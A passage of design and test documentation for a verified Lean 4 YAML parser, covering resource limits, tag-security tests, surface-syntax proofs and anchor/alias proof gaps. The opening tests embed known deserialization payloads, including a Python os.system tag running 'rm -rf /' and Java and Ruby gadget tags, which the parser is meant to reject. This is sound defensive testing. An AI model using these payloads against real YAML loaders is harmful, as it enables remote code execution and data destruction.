check "error contains useful context" do
  let yaml := "items:\n  - - - - - - (100 levels)"
  match parseYaml yaml { structural.maxDepth := 10 } with
  | .error (.structuralLimit (.depthExceeded depth limit path)) =>
    if depth ≤ limit then throw "depth should exceed limit"
    if path.isEmpty then throw "path should not be empty"
  | _ => throw "expected depth exceeded error"

setCategory "Tag Security"

check "Python code execution tag blocked" do
  let yaml := "exploit: !!python/object/apply:os.system\n  args: ['rm -rf /']"
  match parseYaml yaml ParserLimits.strict with
  | .error (.tagSecurity (.dangerousLanguageTag tag "Python")) =>
    if !tag.containsSubstr "python" then
      throw s!"expected python tag, got: {tag}"
  | .ok _ => throw "CRITICAL: Dangerous Python tag was not blocked!"
  | .error other => throw s!"wrong error type: {other}"

check "Java RCE tag blocked" do
  let yaml := "!!javax.script.ScriptEngineManager [...]\n"
  match parseYaml yaml ParserLimits.strict with
  | .error (.tagSecurity (.dangerousLanguageTag tag "Java")) =>
    if !tag.containsSubstr "java" then
      throw s!"expected java tag, got: {tag}"
  | .ok _ => throw "CRITICAL: Dangerous Java tag was not blocked!"
  | .error other => throw s!"wrong error type: {other}"

check "Ruby deserialization tag blocked" do
  let yaml := "--- !ruby/object:Gem::Installer\n  i: x"
  match parseYaml yaml ParserLimits.strict with
  | .error (.tagSecurity (.dangerousLanguageTag tag "Ruby")) =>
    if !tag.containsSubstr "ruby" then
      throw s!"expected ruby tag, got: {tag}"
  | .ok _ => throw "CRITICAL: Dangerous Ruby tag was not blocked!"
  | .error other => throw s!"wrong error type: {other}"

check "Core Schema tags accepted" do
  let yaml := "str: !!str hello\nint: !!int 42\nfloat: !!float 3.14\nbool: !!bool true\nnull: !!null\nseq: !!seq [1,2,3]\nmap: !!map {a: 1}"
  match parseYaml yaml ParserLimits.strict with
  | .ok docs =>
    if docs.size != 1 then throw s!"expected 1 document, got {docs.size}"
  | .error err => throw s!"Core Schema tags should be accepted: {err}"

check "non-Core-Schema custom tag rejected in strict mode" do
  let yaml := "config: !!myapp/config\n  key: value"
  match parseYaml yaml ParserLimits.strict with
  | .error (.tagSecurity (.nonCoreSchemaTag tag)) =>
    if !tag.containsSubstr "myapp" then
      throw s!"wrong tag in error: {tag}"
  | .ok _ => throw "custom tag should be rejected in strict mode"
  | .error other => throw s!"wrong error type: {other}"

check "custom tag accepted in whitelist" do
  let limits := { ParserLimits.strict with
    tag := { policy := .whitelist [
      "tag:yaml.org,2002:str", "tag:yaml.org,2002:int",
      "!!myapp/config"
    ], rejectLanguageTags := true }
  }
  let yaml := "config: !!myapp/config\n  key: value"
  match parseYaml yaml limits with
  | .ok _ => pure ()
  | .error err => throw s!"whitelisted tag should be accepted: {err}"

check "dangerous tag rejected even in whitelist if rejectLanguageTags=true" do
  let limits := { ParserLimits.strict with
    tag := { policy := .whitelist ["!!python/object/apply:os.system"],
             rejectLanguageTags := true }
  }
  let yaml := "exploit: !!python/object/apply:os.system\n  args: ['ls']"
  match parseYaml yaml limits with
  | .error (.tagSecurity (.dangerousLanguageTag _ "Python")) => pure ()
  | .ok _ => throw "rejectLanguageTags should override whitelist"
  | .error other => throw s!"wrong error type: {other}"

check "tag length limit enforced" do
  let longTag := "!!" ++ String.replicate 5000 "x" ++ "\nvalue: test"
  match parseYaml longTag ParserLimits.strict with
  | .error (.tagSecurity (.tagTooLong bytes limit _)) =>
    if bytes ≤ limit then throw s!"tag length {bytes} should exceed limit {limit}"
  | .ok _ => throw "tag length limit should be enforced"
  | .error other => throw s!"wrong error type: {other}"

check "unlimited mode accepts all tags (UNSAFE)" do
  let yaml := "exploit: !!python/object/apply:os.system\n  args: ['echo unsafe']"
  match parseYaml yaml ParserLimits.unlimited with
  | .ok _ => pure ()  -- Unlimited mode bypasses all checks
  | .error err => throw s!"unlimited mode should accept all tags: {err}"
```

#### yaml-test-suite Regression

Ensure no false negatives: all 406 yaml-test-suite tests passing with `ParserLimits.permissive` should still pass.

Run: `lake exe suiterunner --limits permissive` (the `--limits` flag is implemented in `Tests/SuiteRunner/Main.lean`; presets: `default`, `strict`, `permissive`, `unlimited`, `safe_tags`).

### Implementation Checklist — Landed As (2026-07-31)

The phase-by-phase implementation checklist that originally occupied this
section described planned work; the runtime portion (Phases 1–6) has since
landed. Where each planned item ended up:

| Planned item | Landed as |
|---|---|
| Error type hierarchy (`AliasLimitError`, `StructuralLimitError`, `DocumentLimitError`, `TagSecurityError`, `LimitError`, `ParseError`) | `L4YAML/Config/Limits.lean:188-311` |
| `ParserLimits` + nested limit structures (`AliasLimits`, `StructuralLimits`, `DocumentLimits`, `TagLimits`) + `TagPolicy` | `L4YAML/Config/Limits.lean:45-131` |
| Predefined configurations | `strict` / `permissive` / `unlimited` / `safeTagsOnly` (`L4YAML/Config/Limits.lean:138-176`) |
| Limited alias resolution with tracker | `resolveAliasesLimited` (`L4YAML/Config/Limits.lean:433`) |
| Tag validation | `validateTag` (`L4YAML/Config/Limits.lean:345`) |
| Limit-aware entry point | `parseYamlSafe` (`L4YAML/Config/Limits.lean:628`) |
| Guard/runtime tests | `Tests/LimitTests.lean` — 43 checks across all limit categories |
| `--limits` CLI flag | `suiterunner` exe (`Tests/SuiteRunner/Main.lean`; presets `default` / `strict` / `permissive` / `unlimited` / `safe_tags`) |
| Security documentation | `doc/Doc/L4YAML/Security.lean` (rendered manual chapter) |
| Phase 7: Verification | **Still open** — the limit-enforcement proofs (soundness/completeness preservation, termination under limits, error-type exhaustiveness, tag-validation correctness) remain future work; see "Incremental Proof Strategy" above |

### References

#### Standards & Specifications

- [YAML 1.2.2 §3.2.1 – Node Representation](https://yaml.org/spec/1.2.2/#321-representation-graph): "The representation is acyclic" — cyclic aliases violate spec
- [CWE-776: Improper Restriction of Recursive Entity References](https://cwe.mitre.org/data/definitions/776.html)
- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)

#### Prior Art

**SnakeYAML** (Java):
- `maxAliasesForCollections` (default: 50): maximum aliases in a single collection
- `codePointLimit` (default: 3MB): maximum characters in input
- See: [CVE-2022-38752](https://nvd.nist.gov/vuln/detail/CVE-2022-38752), [CVE-2022-41854](https://nvd.nist.gov/vuln/detail/CVE-2022-41854)

**PyYAML** (Python):
- No default limits (historically vulnerable)
- Community advice: wrap parser with custom loaders imposing limits
- See: [Billion Laughs Attack Explanation](https://en.wikipedia.org/wiki/Billion_laughs_attack#YAML)

**go-yaml** (Go):
- `SetReaderLimit`: maximum bytes to read from input (default: 10MB)
- `SetDecodeDepth`: maximum nesting depth (default: 10,000)

**ruamel.yaml** (Python):
- `max_aliases` (default: None): user-configurable alias limit
- `allow_duplicate_keys` (default: True): can reject duplicates as attack vector

#### Attack Demonstrations

- [YAML Bomb Generator](https://github.com/kushaldas/yaml-bomb): Tool for constructing exponential expansion payloads
- [OWASP Testing Guide – XML Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection): XML billion laughs applies to YAML via aliases


This document addresses **two critical vulnerability classes** in YAML parsers:

#### 1. Denial-of-Service (DoS) Protection

**Billion laugh attacks** and resource exhaustion prevented through:
- Alias expansion limits (depth, count, resolved nodes)
- Structural limits (nesting depth, collection sizes, scalar sizes)
- Document limits (stream size, anchor count)
- Cycle detection

**Real-world impact**: PyYAML, SnakeYAML, and other parsers have suffered CVEs from billion laugh attacks. Resource limits are **essential** for parsing untrusted input.

#### 2. Arbitrary Code Execution (ACE) Protection

**Dangerous language-specific tags** blocked through:
- Tag policy enforcement (whitelist/blacklist/Core Schema only)
- Language-specific tag rejection (!!python/*, !!java/*, !!ruby/*)
- Custom tag handle validation
- Tag length limits

**Real-world impact**: PyYAML's `yaml.load()` and SnakeYAML have enabled **remote code execution** in countless applications. Tag validation is **critical** for security.

#### Defense-in-Depth Strategy

The combined approach provides layered security:

1. **Input validation** (tag security): Reject dangerous patterns before processing
2. **Resource limits** (DoS protection): Prevent exhaustion during processing
3. **Error transparency** (structured errors): Enable security monitoring and auditing
4. **Safe-by-default** (strict mode): Conservative limits unless explicitly relaxed

**Recommendation**: Always use `ParserLimits.strict` for untrusted input. Only relax limits after security review.

### Summary: Benefits of Structured Error Types

#### For Users

1. **Precise error handling**: Pattern match on specific error types for targeted recovery
2. **Better diagnostics**: Error messages include context (paths, counts, limits) for debugging
3. **Graceful degradation**: Can retry with relaxed limits on `LimitError` but not `SyntaxError`
4. **Security auditing**: Machine-readable error data enables DoS detection, attack pattern recognition, and rate limiting
5. **Threat intelligence**: Dangerous tag detections can trigger security alerts and incident response

#### For Implementers

1. **Type safety**: Exhaustiveness checking prevents missing error cases
2. **Maintainability**: Adding new errors doesn't require string parsing updates
3. **Refactoring confidence**: Compiler catches all sites needing updates when errors change
4. **Testing**: Can assert on specific error types, not string matching

#### For Verification

1. **Proof modularity**: Separate theorems for each error category
2. **Strong specifications**: Error constructors are predicates over parser state
3. **Decidability**: Error type equality is decidable, enabling `native_decide` proofs
4. **Composability**: Error type lifting (`AliasLimitError → LimitError → ParseError`) preserves semantics

#### Migration Path

- **Phase 1** (Week 1): Implement error types, keep `Except String` wrappers for compatibility
- **Phase 2** (Week 2-3): Migrate internal code to structured errors
- **Phase 3** (Week 4+): Deprecate string-based API, remove wrappers
- **Phase 4** (Month 3-6): Add verification proofs for error type correctness

The structured approach adds minimal overhead (5 days implementation) while providing long-term benefits for safety, usability, and verification.

---

**Document version**: 3.0
**Last updated**: 2026-03-11
**Changelog**:
- v3.0: **MAJOR**: Added tag security to prevent arbitrary code execution
  - Added threat model for ACE via unsafe tags (!!python/*, !!java/*, !!ruby/*)
  - Added `TagSecurityError` inductive with 7 security violation types
  - Added `TagLimits` configuration with `TagPolicy` (whitelist/blacklist/Core Schema)
  - Added dangerous tag detection for Python, Java, Ruby, PHP, Perl
  - Added Core Schema whitelist (!!str, !!int, !!float, !!bool, !!null, !!seq, !!map)
  - Added tag length limits and handle prefix validation
  - Added comprehensive security testing examples and patterns
  - Updated all configurations to include tag security (`.strict`, `.permissive`, `.safeTagsOnly`)
  - Extended implementation time from 5 to 7-8 days, proof time from 6-12 to 8-14 weeks
- v2.0: Refactored to use structured inductive error types instead of `Except String`
  - Added error type hierarchy: `AliasLimitError` | `StructuralLimitError` | `DocumentLimitError`
  - Added `ParseError` distinguishing syntax vs. limit violations
  - Added error handling patterns and migration guide
  - Updated all API signatures and proof theorems
  - Added design rationale and alternatives analysis
- v1.0: Initial draft with string-based errors (DoS prevention only)

**Author**: Generated for lean4-yaml-verified.iterators

**Security Note**: Tag validation is **critical** for preventing remote code execution. Always use `ParserLimits.strict` or `ParserLimits.safeTagsOnly` when parsing untrusted input. The `ParserLimits.unlimited` configuration should NEVER be used with external input.

---

## Surface syntax formalization

*(was `STRICTNESS.md` — "Formalizing YAML 1.2.2 Surface Syntax"; consolidated into this file 2026-08-01, file-level history in git)*

### TL;DR

This document describes the **acceptance strictness** formalization for v0.4.0:
encoding the YAML 1.2.2 surface syntax (productions [1]–[211]) as Lean 4
parameterized inductive predicates over positioned character streams, and the
target theorem `parse_strict : parseYaml s = .ok docs → InYamlLanguage s`.

**Status (2026-07-31)**: **Complete.** Surface syntax grammar formalized in 6
modules, 18 mutual inductives for the node/collection layer. The target
theorems `parse_strict` and `scan_strict` are **proven** (v0.4.6) as thin
wrappers in `L4YAML/Surface/Surface.lean` over the `@[capstone]` theorems
`parse_strict_proof` / `scan_strict_proof` in
`L4YAML/Proofs/Production/DocumentProduction.lean` — see
Blueprint/04-capstones.md, Group 7 (the proof-status SSOT). The build/test
counts originally quoted here (391 jobs; 869 passed / 0 failed / 151 skipped;
"~50 coupling theorems in 3 modules") were a v0.4.0 snapshot.

### Architecture

#### Position Model

```lean
structure SurfPos where
  chars : List Char   -- remaining input
  col   : Nat         -- current column (0-based)
```

Each production is a relation `SurfPos → SurfPos → Prop` matching a prefix
of the input and advancing the position. Column resets to 0 on line breaks,
increments by 1 per consumed character. This models YAML's column-sensitive
indentation without carrying full (line, col) — column suffices since
productions only look at column alignment, not line numbers.

#### Module Structure

| Module | Lines | Productions | Description |
|--------|-------|-------------|-------------|
| `Surface/Combinators.lean` | ~85 | — | `SurfPos`, `GChar`, `GLit`, `GSeq`, `GAlt`, `GStar`, `GPlus`, `GOpt`, `GEps`, `GNot` |
| `Surface/Basic.lean` | ~260 | [24]–[101] | Line breaks, whitespace, indentation, comments, separation, directives, node properties |
| `Surface/Scalars.lean` | ~300 | [104]–[175] | Double-quoted, single-quoted, plain scalars, alias nodes, block scalars |
| `Surface/Node.lean` | ~370 | [134]–[199] | 18 mutual inductives: flow/block collections + node dispatchers |
| `Surface/Document.lean` | ~140 | [200]–[211] | Document markers, document types, stream composition |
| `Surface.lean` | ~120 | — | `InYamlLanguage`, `parse_strict`, `scan_strict` |

#### Mutual Inductive Design

Lean 4's kernel forbids nested inductives whose parameters contain local
variables from the same mutual block. This prevents using generic combinators
(`GAlt`, `GOpt`, `GStar`) to wrap mutually-defined types.

**Solution**: All combinator patterns wrapping mutual types are inlined as
explicit constructors. Non-mutual combinator usage is preserved.

Example — `GAlt (SBlockNode n .blockOut) (GSeq SENode SSLComments)` becomes:
```lean
| implicitKeyNode  : ... → SBlockNode n .blockOut s₂ s' → SBlockMapEntry n s s'
| implicitKeyEmpty : ... → SSLComments s₂ s'            → SBlockMapEntry n s s'
```

The 18 mutual inductives in `Node.lean`:
- `SBlockNode`, `SBlockIndented`, `SBlockSeqEntries`, `SBlockMapEntry`,
  `SBlockMapEntries`, `SCompactSeq`, `SCompactSeqTail`, `SCompactMap`,
  `SCompactMapTail`, `SImplicitKey`
- `SFlowNode`, `SFlowContent`, `SFlowSequence`, `SFlowSeqEntries`,
  `SFlowSeqEntry`, `SFlowMapping`, `SFlowMapEntries`, `SFlowMapEntry`

### Gap Analysis: Output Predicates ≠ Input Predicates

Grammar.lean's `ValidNode` captures output structure — "this parse tree
is a valid YAML value" — but NOT input acceptance — "this character
sequence conforms to the YAML syntax."

Concrete examples of the gap:
- `ValidNode.blockSeq 2 items` says the output is a 2-element block
  sequence, but NOT that the input has `-` at the correct column
  followed by correctly-indented content
- `ValidTokenStream` says tokens are ordered and stream-bounded, but
  NOT that inter-token whitespace/comments follow the grammar

The surface syntax predicates close this gap by specifying character-level
acceptance for every YAML production.

### Target Theorems

```lean
lemma parse_strict (input : String) (docs : Array YamlDocument)
    (h : parseYaml input = .ok docs) : InYamlLanguage input

lemma scan_strict (input : String) (tokens : Array (Positioned YamlToken))
    (h : scan input = .ok tokens) : InYamlLanguage input
```

Both are proven (see Status above); the `scan_strict` conclusion was later
strengthened from the originally planned `∃ s', SLYamlStream ⟨input.toList, 0⟩ s'`
to full `InYamlLanguage input`.

**Proof strategy** (bottom-up coupling):
1. Scanner coupling: each scanner function, when successful, advances
   through input matching the surface syntax productions it implements
2. Token parser coupling: token sequence consumption corresponds to
   node-level productions
3. Document composition: full pipeline produces `SLYamlStream`

### What Remains (resolved)

All items are complete as of v0.4.6 — see Blueprint/04-capstones.md, Group 7.
Where the work landed:

- Coupling theorems for the remaining scanner functions:
  `L4YAML/Proofs/Coupling/` (see table below).
- Grammar-production layer (scanner/parser → productions):
  `L4YAML/Proofs/Production/` — `NodeProduction.lean`,
  `StructureProduction.lean`, `PreprocessProduction.lean`,
  `ScalarProduction.lean`, with `StreamAccum.lean` composing the full
  `SLYamlStream` derivation.
- Proofs of `scan_strict` and `parse_strict`: `scan_strict_proof` /
  `parse_strict_proof` (`@[capstone]`) in
  `L4YAML/Proofs/Production/DocumentProduction.lean`.
- Production coverage against the YAML 1.2.2 spec numbering:
  machine-checked via `@[yaml_spec]` annotations, indexed in
  `Tests/ProductionCoverage.lean`.

The only open successor item is grammar completeness — the `parse_iff_grammar`
converse (Group 7.7; see the
[Grammar completeness plan](#grammar-completeness-plan) below).

### Coupling Proof Modules

The coupling modules now live under `L4YAML/Proofs/Coupling/` (post-reorg
paths; the theorem counts below are the v0.4.0 snapshot — the modules have
since grown, and two more were added):

| Module | Theorems | Sorry | Description |
|--------|----------|-------|-------------|
| `Proofs/Coupling/SurfaceCoupling.lean` | 20+ | 0 | Pure SurfPos-level properties: SIndent, SBBreak, SSWhite, GSeq, GStar, GOpt, comments, empty node |
| `Proofs/Coupling/CouplingBridge.lean` | 15+ | 0 | Scanner↔SurfPos bridge: `CharsFromOffset` inductive, `ScannerSurfCorr` struct, peek/eof/advance correspondence, production coupling, composition helpers |
| `Proofs/Coupling/ScannerCoupling.lean` | 8 | 0 | Scanner loop coupling: `skipSpacesLoop_corr` (induction on fuel → SIndent), `skipSpaces_corr` (top-level wrapper), `consumeNewline_{lf,crlf,cr}_corr` (line breaks → SBBreak), helper lemmas for peek/fuel budget |
| `Proofs/Coupling/ScalarCoupling.lean` | — | 0 | (added later) Scalar collection coupling: scanner scalar-scanning loops → surface syntax scalar productions |
| `Proofs/Coupling/StructureCoupling.lean` | — | 0 | (added later) Structure, document & directive coupling: flow/block indicators, node properties (anchors + tags), indentation management |


---

## Anchor and alias pipeline rationale

*(was `SPEC-GAP-ANALYSIS.md` — "Specification Gap Analysis"; consolidated into this file 2026-08-01, file-level history in git)*

**Date:** 2026-03-18 (updated); closure note 2026-07-31
**Status:** **CLOSED** — Gap #8 proven (`parseStream_output_aliases_resolve`,
`L4YAML/Proofs/Parser/ParserAnchorProofs.lean:201`) and Gap #9 proven
(`parseStream_output_anchors_wellformed`, `L4YAML/Proofs/Parser/ParserWfaProofs.lean:1691`).
The library is sorry-free since 2026-07-04 (see
[Blueprint/04-capstones.md](Blueprint/04-capstones.md), the proof-status SSOT).
This document is kept as the design rationale for the anchor/alias pipeline.

> **Path map (2026-04 reorg):** file references below predate the folder
> reorganization — `ParserNodeProofs.lean` → `L4YAML/Proofs/Parser/ParserNodeProofs.lean`;
> the `addAnchor` definition (with its `adaptForFlowContext` call) →
> `L4YAML/Parser/State.lean:140-141`; `adaptForFlowContext` →
> `L4YAML/Spec/Types.lean:552`. Non-capstone `theorem` declarations are now
> spelled `lemma` (2026-07-31 rename).

### Overview

All algorithmic/structural theorems in the C2 proof chain are proved.
The remaining sorrys are in the **anchor/alias resolution** layer,
where the proof chain connects parser output (`Scannable`) to composed
output (`Grammable`). The composition theorem `compose_value_grammable`
requires two hypotheses:

| # | Theorem | Predicate | Status |
|---|---------|-----------|--------|
| 8 | `parseStream_output_aliases_resolve` | `AllAliasesResolve` | **Fully proven** — all helper sorrys discharged |
| 9 | `parseStream_output_anchors_wellformed` | `WellFormedAnchors` | **Sorry** — specification modeling gap (`∀ inFlow` too strong) |

---

### Gap #8: `AllAliasesResolve` — Alias Ordering

#### Status: All Phases Complete

The parser validates aliases at parse time (§7.1 compliance).
`parseNode` rejects `*name` unless `name ∈ ps.anchors`, producing
an `undefinedAlias` error. The top-level theorem is fully proven
with **zero sorrys**:

```lean
theorem parseStream_output_aliases_resolve
    (tokens : Array (Positioned YamlToken))
    (docs : Array YamlDocument)
    (h_parse : parseStream tokens = .ok docs) :
    ∀ doc ∈ docs.toList, AllAliasesResolve doc.value doc.anchors
```

**Proof chain:** `parseStream` → `parseStreamLoop_aliases_resolve` →
`parseDocument_aliases_resolve` → `parseNode_aliases_resolve`.

Both helper lemmas are now proved (in `L4YAML/Proofs/ParserNodeProofs.lean`):
1. `parseNode_aliases_resolve` — core strong induction on fuel over 14 sub-parsers,
   showing every alias in the output tree passed the `ps.anchors.any` check
2. `parseNode_anchors_grow` — anchors only grow (monotonicity), proved via
   AnchorsGrow (AG) relation with strong induction on fuel

#### Implementation Changes

1. **Token.lean**: Added `| undefinedAlias (name : String) (line col : Nat)`
   to `ScanError` + `toString` case
2. **TokenParser.lean**: `parseNode` alias branch now checks
   `ps.anchors.any (fun (n, _) => n == name)` before proceeding
3. **ParserGrammable.lean**: Proof infrastructure:
   - `any_name_implies_findSome_isSome` — bridge from `Array.any` to
     `Array.findSome? .isSome` (what `AllAliasesResolve.alias` requires)
   - `AllAliasesResolve.push` / `AllAliasesResolve.mono` — monotonicity
   - `parseStreamLoop_aliases_resolve` — loop induction
   - `parseDocument_aliases_resolve` — document-level lift

#### Why Phase 1 the Sorrys Are Small

Both remaining sorrys are structural induction proofs over `parseNode`:
- They unfold `parseNode` at fuel `k+1`, split on the token match, and
  for recursive cases (sequences, mappings) use the IH at fuel `≤ k`
- The alias branch is trivial: the `if` guard provides the witness
- The scalar/empty branches are trivial: no aliases in the tree
- The recursive branches need monotonicity (`parseNode_anchors_grow`)
  to lift child-level IH to parent-level anchors

#### Remaining Phase Plan (revised: Phase 3 → Phase 2)

The original D → B → A ordering assumed Phase 2's parser-level mutual
induction would "template" Phase 3's scanner proof.  In practice the
two induction shapes are unrelated (14-function mutual induction vs.
`scanLoop` state-machine induction with 5-level dispatch), so Phase 2
provides no scaffolding for Phase 3.  Going scanner-first is better:

- **Phase 3 (complete)**: `definedAnchors : Array String` added to
  `ScannerState`.  Scanner-level alias validation in dispatch layer.
  `scanAnchorOrAlias` kept pure; all preservation theorems untouched.
  Document boundaries reset field.  Dispatch proofs updated.
- **Phase 2 (complete)**: Discharged `parseNode_aliases_resolve`
  and `parseNode_anchors_grow` via strong induction on fuel in
  `ParserNodeProofs.lean` (~1781 lines).  The proof uses AG
  (AnchorsGrow) and AAR (AllAliasesResolve) relations with blind
  split patterns over all 14 sub-parsers.  No scanner precondition
  needed — the parser's own `if` guard on aliases suffices.

#### Resolution Options

| Option | Effort | Impact | Recommended? |
|--------|--------|--------|--------------|
| **A. Scanner invariant proof** | High | Closes gap fully + proves §7.1 conformance | ✅ Ideal — semantically correct |
| **B. Parser-level tracking** | Medium | Closes gap fully at parser level | ✅ Template for Option A |
| **C. Precondition** | Low | Shifts burden to caller | ⚠️ Weakens theorem |
| **D. Parser-level validation** | Low (code) | Closes sorry by construction | ✅ Immediate result |

##### Option A: Scanner Invariant Proof (with `definedAnchors` field)

Prove from the scanner's state machine that for every `.alias name`
token at position `i`, there exists a `.anchor name` token at position
`j < i`. This is **semantically correct** — it captures what
YAML §7.1 requires.

**Approach:** Add a `definedAnchors : Array String` field to `ScannerState`.
This is preferable to logical ghost state because:
- Ghost state artificially papers over the fact that `ScannerState`
  is incomplete — it lacks information that is genuinely part of the
  scanner's semantic state
- A real field makes the invariant self-evident: `scanAnchorOrAlias`
  with `isAnchor = true` pushes to `definedAnchors`; with
  `isAnchor = false` it checks membership
- The field is semantically meaningful ("which anchors have been
  defined in this document"), not an artificial proof artifact

**Estimated work:**
- Add `definedAnchors : Array String` to `ScannerState` (+ reset on
  document boundaries in `scanDocumentStart`/`scanDocumentEnd`)
- ~15 scanner functions need `definedAnchors`-preservation lemmas
  (mechanical: most don't touch the field)
- The 5-level dispatch decomposition helps: each level needs only a
  pass-through lemma
- `scanAnchorOrAlias` proof is the substantive one: push for anchors,
  membership check for aliases
- Thread through `scanLoop` induction

##### Option B: Parser-Level Tracking

Add a parser invariant: "after processing token `i`, every `.alias name`
node in the partial value tree has `name ∈ ps.anchors`." This is easier
than the scanner invariant because the parser processes tokens linearly
and `ps.anchors` grows monotonically via `addAnchor`.

Concretely:
1. Each `_wb` lemma gets an additional conclusion: `∀ (.alias name) in result.value, name ∈ ps'.anchors`
2. `parseDocument` collects these into the document's anchor map
3. `parseStream_doc_from_parseDocument` lifts this to stream level

This threads through the existing proof infrastructure and leverages the
already-proved `_wb` chain.

##### Option C: Precondition

Add `AliasesHaveAnchors tokens` as a hypothesis:
```lean
def AliasesHaveAnchors (tokens : Array (Positioned YamlToken)) : Prop :=
  ∀ i (hi : i < tokens.size),
    match (tokens[i]'hi).val with
    | .alias name => ∃ j (hj : j < i), (tokens[j]'(by omega)).val = .anchor name
    | _ => True
```

Then prove `parseStream_output_aliases_resolve` under this assumption.
The precondition would need to be discharged at the top level (from
`scanFiltered`), effectively deferring the scanner invariant.

##### Option D: Scanner Validation

Modify `scanAnchorOrAlias` to reject aliases when the name is not in a
running set of defined anchors. This closes the gap by construction but
changes the scanner's behavior (it would now reject some inputs that the
YAML spec also rejects, so this is spec-compliant).

---

### Gap #9: `WellFormedAnchors` — Cross-Context Aliasing

#### What We Need to Prove

```lean
theorem parseStream_output_anchors_wellformed
    (tokens : Array (Positioned YamlToken))
    (docs : Array YamlDocument)
    (h_scan_tokens : PlainScalarsValid tokens)
    (h_parse : parseStream tokens = .ok docs) :
    ∀ doc ∈ docs.toList, WellFormedAnchors doc.anchors
```

> **As landed:** the proven lemma at
> `L4YAML/Proofs/Parser/ParserWfaProofs.lean:1691` takes `FlowAwarePSV tokens`
> and `FlowBracketsMatched tokens` as hypotheses in place of
> `PlainScalarsValid tokens`.

where:

```lean
def WellFormedAnchors (anchors : Array (String × YamlValue)) : Prop :=
  ∀ (name : String) (val : YamlValue),
    anchors.findSome? (fun (n, v) => if n == name then some v else none) = some val →
      ∀ inFlow, Grammable val.stripAnchors inFlow
```

The `∀ inFlow` quantifier is the problem. It requires that **every**
anchored value is `Grammable` in **both** `inFlow = false` (block context)
and `inFlow = true` (flow context).

#### Where the Gap Comes From

**This is a specification modeling gap at the intersection of YAML's
representation and serialization levels.**

The root cause is a level mismatch:

- **`Grammable`** is a *serialization-level* concept. It means: "this
  value tree can be serialized to YAML text conforming to the grammar."
  Specifically, `Grammable (.scalar s) true` requires `ScalarScannable s true`,
  which requires `noFlowIndicators s.content` for plain scalars.

- **Alias resolution** is a *representation-level* concept. YAML §3.1
  defines the composed representation graph as context-free — there is
  no flow/block distinction at the representation level.

- **`WellFormedAnchors` bridges these levels** by requiring that every
  anchor value is `Grammable` in all serialization contexts. This is
  too strong because it demands re-serializability in contexts where
  the value may never appear.

#### Concrete Counterexample

```yaml
block: &anchor value{with}braces
flow: [*anchor]
```

1. `value{with}braces` is scanned as a plain scalar in block context.
   `ScalarScannable _ false` passes — the `noFlowIndicators` check is
   only required when `inFlow = true`.

2. `addAnchor` stores `("anchor", .scalar { content := "value{with}braces", style := .plain, ... })`
   in `ps.anchors` (after `resolveAliases` + `stripAnchors`, which are identity for scalars).

3. `WellFormedAnchors` demands `∀ inFlow, Grammable (.scalar ...) inFlow`.
   For `inFlow = true`: `ScalarScannable _ true` requires `noFlowIndicators "value{with}braces"`,
   which fails because `{` and `}` are flow indicators.

4. Therefore `WellFormedAnchors doc.anchors` is **literally false** for
   this document — the predicate is unsatisfiable.

#### Is This a YAML Spec Problem?

**Partially.** The YAML spec is under-specified here:

- §7.1 allows cross-context aliasing: an anchor defined in block context
  can be aliased in flow context.
- §3.1 defines the composed representation graph without serialization
  context — the graph is context-free.
- But YAML assumes round-trippability: the representation should be
  re-serializable to valid YAML. If an alias in flow context resolves
  to a plain scalar with flow indicators, the composed representation
  cannot be serialized back to YAML using the same scalar style.

In practice, YAML implementations handle this by:
- Changing the scalar style during serialization (e.g., double-quoting
  the scalar if it contains flow indicators).
- Or simply not validating grammar compliance of alias-resolved values.

Our formalization does not model style adaptation during serialization.
The `Grammable` predicate checks whether the *existing* style is valid,
not whether *some* valid style exists.

#### Why `∀ inFlow` Exists

The `∀ inFlow` quantifier in `WellFormedAnchors` was introduced because
`compose_value_grammable` needs:

```lean
  | alias name inFlow =>
    ...
    exact h_anchors name resolved h_val inFlow   -- ← inFlow from alias site
```

When processing an `.alias name` at the alias's site, the `inFlow`
parameter comes from the **alias's context** (e.g., `true` if inside a
flow sequence). The composition theorem doesn't know at anchor-definition
time which context(s) the alias will appear in, so `WellFormedAnchors`
conservatively requires `∀ inFlow`.

#### Resolution Options

| Option | Effort | Impact | Changes spec? |
|--------|--------|--------|---------------|
| **A. Context-aware `WellFormedAnchors`** | Medium | Closes gap precisely | Yes — new predicate |
| **B. Style-flexible `Grammable`** | Medium | Closes gap at right level | Yes — weaker Grammable |
| **C. Precondition on input** | Low | Restricts to "nice" YAML | Yes — new precondition |
| **D. Accept and document** | None | Gap remains | No |

##### Option A: Context-Aware `WellFormedAnchors`

Replace the `∀ inFlow` with the **actual flow contexts** where each
anchor is aliased:

```lean
def WellFormedAnchorsCtx
    (anchors : Array (String × YamlValue))
    (aliasContexts : String → List Bool) : Prop :=
  ∀ (name : String) (val : YamlValue),
    anchors.findSome? (...) = some val →
      ∀ inFlow ∈ aliasContexts name, Grammable val.stripAnchors inFlow
```

This requires tracking which `inFlow` values each alias name appears
under. The `compose_value_grammable` proof would need to construct
`aliasContexts` from the value tree. This is semantically correct but
affects the entire proof chain.

**Variant A':** Since `inFlow` is a `Bool`, there are only 4 cases per
anchor: used in {block only, flow only, both, neither}. The "both"
case has the same problem as `∀ inFlow`. But for "flow only" or "block
only" aliases, this resolves the gap.

##### Option B: Style-Flexible `Grammable`

Change `Grammable` to allow style adaptation:

```lean
inductive Grammable : YamlValue → Bool → Prop where
  | scalar (s : Scalar) (inFlow : Bool)
      (h : ∃ s', s'.content = s.content ∧ ScalarScannable s' inFlow) :
      Grammable (.scalar s) inFlow
```

This says: "the scalar's *content* can be represented in this context,
possibly with a different style." A plain scalar with flow indicators
would be `Grammable _ true` because it could be double-quoted.

This is arguably the **correct** semantics for round-trip grammability:
the content is serializable, even if the specific style needs to change.

Note: This changes the meaning of the final theorem. Currently, it says
"the parser output's *exact style* is grammar-compliant." Option B would
say "the parser output's *content* is grammar-compliant in some style."

##### Option C: Precondition on Input

Add a hypothesis that block-context plain scalars under anchors don't
contain flow indicators:

```lean
def NoFlowIndicatorsInBlockAnchors (tokens : Array (Positioned YamlToken)) : Prop :=
  ∀ i (hi : i < tokens.size),
    flowNesting tokens i = 0 →       -- block context
    hasAnchorBefore tokens i = true → -- preceded by anchor token
    match (tokens[i]'hi).val with
    | .scalar content .plain => noFlowIndicatorsProp content
    | _ => True
```

This restricts the verified class of YAML documents to those where
